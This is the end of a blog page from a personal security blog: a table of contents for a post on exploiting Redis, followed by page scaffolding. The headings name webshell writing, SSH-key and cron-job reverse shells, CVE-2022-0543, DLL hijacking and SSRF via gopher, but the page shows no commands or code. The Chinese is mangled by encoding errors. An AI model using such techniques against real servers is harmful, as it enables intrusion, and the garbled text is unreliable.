<li><a href="#0x04-redis-winlinxu-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x04 Redis Win&amp;Linxu æ¼æ´åˆ©ç”¨</a>
<ul>
<li><a href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83">Redisæœªæˆæƒ</a>
<ul>
<li><a href="#1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">1.æ¼æ´åˆ©ç”¨</a></li>
</ul>
</li>
<li><a href="#%E5%88%A9%E7%94%A8-redis-%E5%86%99%E5%85%A5webshell">åˆ©ç”¨ Redis å†™å…¥webshell</a>
<ul>
<li><a href="#1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">1.æ¼æ´åŸç†</a></li>
<li><a href="#2%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF">2.åˆ©ç”¨åœºæ™¯</a></li>
<li><a href="#3%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B">3.åˆ©ç”¨è¿‡ç¨‹</a></li>
</ul>
</li>
<li><a href="#%E5%88%A9%E7%94%A8-redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-getshell">åˆ©ç”¨ Redis ä¸»ä»å¤åˆ¶ Getshell</a>
<ul>
<li><a href="#1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2">1.æ¼æ´åŸç†</a></li>
<li><a href="#2%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-2">2.åˆ©ç”¨åœºæ™¯</a></li>
<li><a href="#3%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-2">3.åˆ©ç”¨è¿‡ç¨‹</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x05-redis-linux-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x05 Redis Linux æ¼æ´åˆ©ç”¨</a>
<ul>
<li><a href="#%E5%88%A9%E7%94%A8-redis-%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5">åˆ©ç”¨ Redis å†™å…¥SSHå…¬é’¥</a>
<ul>
<li><a href="#1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3">1.æ¼æ´åŸç†</a></li>
<li><a href="#2%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-3">2.åˆ©ç”¨åœºæ™¯</a></li>
<li><a href="#3%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-3">3.åˆ©ç”¨è¿‡ç¨‹</a></li>
</ul>
</li>
<li><a href="#%E5%88%A9%E7%94%A8-redis-%E5%86%99%E5%85%A5linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">åˆ©ç”¨ Redis å†™å…¥Linuxè®¡åˆ’ä»»åŠ¡</a>
<ul>
<li><a href="#1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4">1.æ¼æ´åŸç†</a></li>
<li><a href="#2%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-4">2.åˆ©ç”¨åœºæ™¯</a></li>
<li><a href="#3%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-4">3.åˆ©ç”¨è¿‡ç¨‹</a></li>
</ul>
</li>
<li><a href="#redis-lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ccve-2022-0543">Redis Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-0543ï¼‰</a>
<ul>
<li><a href="#1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5">1.æ¼æ´åŸç†</a></li>
<li><a href="#2%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-5">2.åˆ©ç”¨åœºæ™¯</a></li>
<li><a href="#3%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-5">3.åˆ©ç”¨è¿‡ç¨‹</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x06-redis-windows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x06 Redis Windowsæ¼æ´åˆ©ç”¨</a>
<ul>
<li><a href="#%E5%88%A9%E7%94%A8-redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-dll%E5%8A%AB%E6%8C%81-getshell">åˆ©ç”¨ Redis ä¸»ä»å¤åˆ¶ DLLåŠ«æŒ Getshell</a>
<ul>
<li><a href="#1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6">1.æ¼æ´åŸç†</a></li>
<li><a href="#2%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF-6">2.åˆ©ç”¨åœºæ™¯</a></li>
<li><a href="#3%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-6">3.åˆ©ç”¨è¿‡ç¨‹</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x07-ssrf-%E5%AF%B9-redis-%E7%9A%84%E5%88%A9%E7%94%A8">0x07 SSRF å¯¹ Redis çš„åˆ©ç”¨</a>
<ul>
<li><a href="#dict%E5%8D%8F%E8%AE%AE">dictåè®®</a></li>
<li><a href="#gopher%E5%8D%8F%E8%AE%AE">gopheråè®®</a></li>
<li><a href="#%E6%97%A0%E8%AE%A4%E8%AF%81ssrf%E6%94%BB%E5%87%BB">æ— è®¤è¯SSRFæ”»å‡»</a></li>
<li><a href="#%E6%9C%89%E8%AE%A4%E8%AF%81ssrf%E6%94%BB%E5%87%BB">æœ‰è®¤è¯SSRFæ”»å‡»</a></li>
<li><a href="#%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC">é€šç”¨åˆ©ç”¨è„šæœ¬</a></li>
</ul>
</li>
<li><a href="#0x08-tips">0x08 Tips</a>
<ul>
<li><a href="#config%E5%91%BD%E4%BB%A4%E7%A6%81%E7%94%A8%E7%BB%95%E8%BF%87">configå‘½ä»¤ç¦ç”¨ç»•è¿‡</a></li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%BA%E4%BD%95%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9shell">è®¡åˆ’ä»»åŠ¡ä¸ºä½•æ²¡æœ‰æˆåŠŸåå¼¹shell</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

                     </div>
                    <section class="post-copyright en">
                        <!--en-->
                        <p class="copyright-item">
                            <span>Author:</span>
			    <span>æ–¯æ–‡</span>
<!--
                            <span>æ”»åŸè‚¾é€shi | sv3nbeast</span>
-->

                        </p>

                        <p class="copyright-item">
                            <span>Permalink:</span>
                            <span><a href="https://www.svenbeast.com/post/g2K6Xk3IG/">https://www.svenbeast.com/post/g2K6Xk3IG/</a></span>
                        </p>

                        <p class="copyright-item">
                            <span>License:</span>
                            <span>MIT License</span>
                        </p>
                    </section>
                    <section class="post-copyright zh">
                        <!--zh-->
                        <p class="copyright-item ">
                            <span>&#x4F5C;&nbsp;&nbsp;&nbsp;&#x8005;:</span>
			    <span>æ–¯æ–‡</span>
<!--
			    <span>æ”»åŸè‚¾é€shi | sv3nbeast</span>
-->

                        </p>

                        <p class="copyright-item">
                            <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
                            <span><a href="https://www.svenbeast.com/post/g2K6Xk3IG/">https://www.svenbeast.com/post/g2K6Xk3IG/</a></span>
                        </p>

                        <p class="copyright-item">
                            <span>&#x534F;&nbsp;&nbsp;&nbsp;&#x8BAE;:</span>
                            <span>MIT License</span>
                        </p>
                    </section>
                    <!--en-->
                    <section class="post-tags en">
                        <div>
                            <span>Tag(s):</span>
                            <span class="tag">
                                
                                
                                <a href="https://www.svenbeast.com/tag/MIQGEYrt9/"># Redis</a>
                                
                                <a href="https://www.svenbeast.com/tag/rwt8EXIMSg/"># ç¬”è®°</a>
                                
                                
                            </span>
                        </div>
                        <div>
                            <a href="javascript:window.history.back();">back</a>
<!--
                            <span>&dot;</span>
                            <a href="#">home</a>
-->
                        </div>
                    </section>
                    <!--zh-->
                    <section class="post-tags zh">
                        <div>
                            <span>&#x6807;&#x7B7E;:</span>
                            <span class="tag">
                                
                                
                                <a href="https://www.svenbeast.com/tag/MIQGEYrt9/"># Redis</a>
                                
                                <a href="https://www.svenbeast.com/tag/rwt8EXIMSg/"># ç¬”è®°</a>
                                
                                
                            </span>
                        </div>
                        <div>
                            <a href="javascript:window.history.back();">
                                &#x8FD4;&#x56DE;</a>
<!--
                            <span>&dot;</span>
                            <a href="#">&#x4E3B;&#x9875;</a>
-->
                        </div>
                    </section>

                    <section class="post-nav">
	               
		       <a class="prev" rel="prev" href="https://www.svenbeast.com/post/kn2fEdp4Q/">
		           åŠ è§£å¯†ä¼ è¾“é€šæ€æ–¹æ¡ˆä¹‹JSRPC
		       </a>
		       
                        
                        <a class="next" rel="next" href="https://www.svenbeast.com/post/XVarhy0Rd/">
                            ä¸€æ¬¡&#34;ç»•&#34;è¿‡wafçš„ç»å†
                        </a>
                        
                    </section>

	<div class="reward"><div class="reward-button">èµ<span class="reward-code"> <span class="alipay-code"> <img class="alipay-img" alt = "support" src="https://www.svenbeast.com/media/images/alipay.png"><b>æ”¯ä»˜å®</b> </span> <span class="wechat-code"> <img alt ="support" class="wechat-img" src="https://www.svenbeast.com/media/images/wechat.png"><b>å¾®ä¿¡</b> </span> </span></div></div>

		<div id="vcomments"></div>
                <script>
                   new Valine({
                   el: '#vcomments',
                   appId: 'haSdMXCqENsvauMnGYsJCsng-gzGzoHsz',
                   appKey: '3xEsy9FFxe0Y7w4hUrdSlSPv',
                   path: window.location.pathname,
                   pageSize: 30,
                   avatar:'mm',
                   notify:true,
                   visitor: true,
                   placeholder: 'è¯„è®ºå‰è¯·å¡«å†™å¥½æ˜µç§°ğŸ‘†ç”Ÿæˆå¤´åƒè¯·åˆ°https://cn.gravatar.com/å®˜ç½‘æ³¨å†Œ:D'
                             })
                   </script>
<!-- ä¿®æ”¹ç‚¹ -->
		<!-- <div id="vlaine-comment"></div>
		<script type="application/javascript" src="https://unpkg.com/valine"></script>
		<script type="application/javascript">
		new Valine({
                   el: '#vlaine-comment',
                   appId: '',
                   appKey: '',
                   path: window.location.pathname,
                   pageSize: 30,
                   avatar:'mm',
                   notify:true,
                   placeholder: 'è¯„è®ºå‰è¯·å¡«å†™å¥½æ˜µç§°ğŸ‘†ç”Ÿæˆå¤´åƒè¯·åˆ°https://cn.gravatar.com/å®˜ç½‘æ³¨å†Œ:D'
                             })
                   </script> -->


		</article>
            </div>
        </div>
    </div>
    </div>
    </div>
        		   
			    <div id="player"></div>
			    
		
<footer id="footer" class="footer" style="height: 0px">

            <div class="copyright">
                <a href="http://beian.miit.gov.cn/" class="_blank" >äº¬ICPå¤‡19028185å·</a>
                    <b id="hitokoto"></b><br>
                    <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
            <path
                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
                fill="#93b5cf"></path>
        </svg>

                    æ”»åŸè‚¾é€shi | sv3nbeast &copy;Copyright
                        <script>
                            var date = new Date();
                            document.write("" + date.getFullYear());
                        </script> <img src="https://i.loli.net/2020/03/31/kG71rUoEW5YQq4h.gif"  alt="dandan" />
                        | æœ¬ç«™å·²ç»è¿è¡Œäº†
                <strong><script type="text/javascript">		

                var urodz= new Date("9/12/2018");
                var now = new Date();
                var ile = now.getTime() - urodz.getTime();
                var dni = Math.floor(ile / (1000 * 60 * 60 * 24));
                document.write(+dni)
                </script>
                </strong>å¤© | ğŸ—
		<a class="rss" href="https://www.svenbeast.com/atom.xml" target="_blank"><strong>RSS</strong></a>
            </div>

<!-- commentTyping -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.2/assets/media/script/commentTyping.js"></script>

<!-- Click loveHeart -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/script/love.js"></script>
        </footer>

        
/*        <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script> 
*/
          
		<div id="landlord" style="right: 5px;bottom: 120px;">
    <div class="message" style="opacity:0"></div>
    <canvas id="live2d" width="500" height="560" class="live2d"></canvas>
    <div class="live_talk_input_body">
        <div class="live_talk_input_name_body">
            <input name="name" type="text" class="live_talk_name white_input" id="AIuserName" autocomplete="off" placeholder="ä½ çš„åå­—" />
        </div>
        <div class="live_talk_input_text_body">
            <input name="talk" type="text" class="live_talk_talk white_input" id="AIuserText" autocomplete="off" placeholder="è¦å’Œæˆ‘èŠä»€ä¹ˆå‘€ï¼Ÿ"/>
            <button type="button" class="live_talk_send_btn" id="talk_send">å‘é€</button>
        </div>
    </div>
    <input name="live_talk" id="live_talk" value="1" type="hidden" />
    <div class="live_ico_box">
//        <div class="live_ico_item type_info" id="showInfoBtn"></div>
//        <div class="live_ico_item type_talk" id="showTalkBtn"></div>
        <div class="live_ico_item type_music" id="musicButton"></div>
        <div class="live_ico_item type_youdu" id="youduButton"></div>
        <div class="live_ico_item type_quit" id="hideButton"></div>
        <input name="live_statu_val" id="live_statu_val" value="0" type="hidden" />
        <audio src="" style="display:none;" id="live2d_bgm" data-bgm="0" preload="none"></audio>
	<input name="live2dBGM" value="http://music.163.com/song/media/outer/url?id=25842621.mp3" type="hidden">
	<input name="live2dBGM" value="http://music.163.com/song/media/outer/url?id=786262.mp3" type="hidden">
        <input id="duType" value="douqilai,l2d_caihong" type="hidden">
    </div>
</div>
<div id="open_live2d">å¬å”¤ä¼Šæ–¯ç‰¹ç“¦å°”</div>
<script>
    var message_Path = '/media/live2d/';//èµ„æºç›®å½•ï¼Œå¦‚æœç›®å½•ä¸å¯¹è¯·æ›´æ”¹
    var talkAPI = '';//å¦‚æœæœ‰ç±»ä¼¼å›¾çµæœºå™¨äººçš„èŠå¤©æ¥å£è¯·å¡«å†™æ¥å£è·¯å¾„
</script>


<!-- //<script src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/js/jquery-3.3.1.min.js"></script> -->
<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>

<script type="text/javascript" src="https://www.svenbeast.com/media/live2d/js/message.js"></script>	
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/live2d/js/live2d.js"></script>
		
            

                <script>
			

                    function LoadPlayer() {
                        var music_array = [];
                        
                        music_array.push({
                            name: 'ä¸‰å›½æ‹',
                            url: 'https://music.163.com/song/media/outer/url?id=1947948874.mp3',
                            artist: 'sv3nbeast',
                            cover: 'https://p2.music.126.net/fw5f7Gifm_vCirn4Hdo2jQ==/109951167435417002.jpg?param=130y130',
//			    lrc: "https://www.svenbeast.com/media/music_lrc/rangjiu.lrc"
                        });
                        
                        console.log(" MusicList: " + music_array);
                        
                        const ap = new APlayer({
                            container: document.getElementById('player'),
                            fixed: true,
                            audio: music_array
                        });
                        
                    }

                    LoadPlayer();
                    

                    
                    loadlive2d();
                    
//                    hitokoto();
                    hljs.initHighlighting();
		    console.clear();
                    console.log("\n %c \u26a1Theme:Chic-Unique Author's Blog:https://github.com/xiangyi715  Write By xiangyi  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
</script>

                

    </div>
<script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>

<script color="0,0,0" opacity="0.4" count="10" src="https://cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.js" type="text/javascript" charset="utf-8"></script>

</body>
<script>
    scroll();
</script>


<!--è¿”å›é¡¶éƒ¨-->
<body id="top">
<p id="back-to-top"><a href="#top"><span></span></a></p>
</body>

<style>
	p#back-to-top {
		position: fixed;
		bottom: 50px;
		right: 50px;
	}
	
	p#back-to-top a {
		text-align: center;
		text-decoration: none;
		color: #d1d1d1;
		display: block;
		width: 30px;
	    /*ä½¿ç”¨CSS3ä¸­çš„transitionå±æ€§ç»™è·³è½¬é“¾æ¥ä¸­çš„æ–‡å­—æ·»åŠ æ¸å˜æ•ˆæœ*/
		-moz-transition: color 2s;
		-webkit-transition: color 2s;
		-o-transition: color 2s;
	}
	p#back-to-top a:hover {
		color: #ff6666;
	}
	p#back-to-top a span {
		background: url(https://i.loli.net/2020/03/13/EwViLWsXlIcgOzm.png) no-repeat center center;
		border-radius: 8px;
		display: block;
		height: 55px;
		width: 30px;
		margin-bottom: 8px;
	      /*ä½¿ç”¨CSS3ä¸­çš„transitionå±æ€§ç»™<span>æ ‡ç­¾èƒŒæ™¯é¢œè‰²æ·»åŠ æ¸å˜æ•ˆæœ*/
		-moz-transition: background 2s;
		-webkit-transition: background 2s;
		-o-transition: background 2s;
	}
	
	#back-to-top a:hover span {
		background: url(https://i.loli.net/2020/03/13/IiApotjMvyOnJEH.png) no-repeat center center;
	}
</style>

<script>
$(document).ready(function() {
    //é¦–å…ˆå°†#back-to-topéšè—
    $("#back-to-top").hide();
 
    //å½“æ»šåŠ¨æ¡çš„ä½ç½®å¤„äºè·é¡¶éƒ¨100åƒç´ ä»¥ä¸‹æ—¶ï¼Œè·³è½¬é“¾æ¥å‡ºç°ï¼Œå¦åˆ™æ¶ˆå¤±
    $(function() {
        $(window).scroll(function() {
            if ($(window).scrollTop() > 100) {
                $("#back-to-top").fadeIn(1500);
            }
            else {
                $("#back-to-top").fadeOut(1500);
            }
        });
        //å½“ç‚¹å‡»è·³è½¬é“¾æ¥åï¼Œå›åˆ°é¡µé¢é¡¶éƒ¨ä½ç½®
        $("#back-to-top").click(function() {
            $('body,html').animate({
                scrollTop: 0
            },
            500);
            return false;
        });
    });
});
</script>

<!--
<style>
	.backToTop {
	display: none;
	width: 18px;
	line-height: 1.2;
	padding: 5px 0;
	background-color: #000;
	color: #fff;
	font-size: 12px;
	text-align: center;
	position: fixed;
	_position: absolute;
	right: 10px;
	bottom: 100px;
	_bottom: "auto";
	cursor: pointer;
	opacity: .6;
	filter: Alpha(opacity = 60);
}
</style>
<script>
(function() {
    var $backToTopTxt = "è¿”å›é¡¶éƒ¨"
    $backToTopEle = $('<div class="backToTop"></div>').appendTo($("body")).text($backToTopTxt)
	.attr("title", $backToTopTxt).click(function() {
        $("html, body").animate({
            scrollTop: 0
        },120);
    })
    $backToTopFun = function() {
        var st = $(document).scrollTop(),
        winh = $(window).height(); (st > 0) ? $backToTopEle.show() : $backToTopEle.hide();
        //IE6ä¸‹çš„å®šä½
        if (!window.XMLHttpRequest) {
            $backToTopEle.css("top", st + winh - 166);
        }
    };
    $(window).bind("scroll", $backToTopFun);
    $(function() {
        $backToTopFun();
    });
})();
</script>
-->

</html>
